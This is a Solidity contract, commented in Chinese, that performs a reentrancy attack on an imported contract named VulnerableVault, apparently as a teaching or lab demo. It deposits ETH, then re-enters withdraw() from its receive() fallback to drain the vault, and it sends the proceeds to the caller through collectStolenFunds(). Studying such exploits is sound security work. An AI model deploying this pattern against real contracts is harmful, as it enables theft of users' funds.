// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {VulnerableVault} from "./Vault.sol";

/**
 * @title VaultAttacker
 * @notice 针对 VulnerableVault 的重入攻击黑客合约
 */
contract VaultAttacker {
    VulnerableVault public targetVault;

    constructor(address _vaultAddress) {
        targetVault = VulnerableVault(_vaultAddress);
    }

    // 触发攻击的主入口
    function attack() external payable {
        require(msg.value > 0, "Need ETH to start attack");
        // 1. 先存入资金获得合法提现资格
        targetVault.deposit{value: msg.value}();
        // 2. 触发提现，开启重入链条
        targetVault.withdraw();
    }

    // 接收 ETH 时的回调函数，关键的重入攻击点！
    receive() external payable {
        // 如果目标 Vault 还有 ETH 余额，则递归再次调用 withdraw()
        if (address(targetVault).balance >= 1 ether) {
            targetVault.withdraw();
        }
    }

    // 攻击者提取资金
    function collectStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
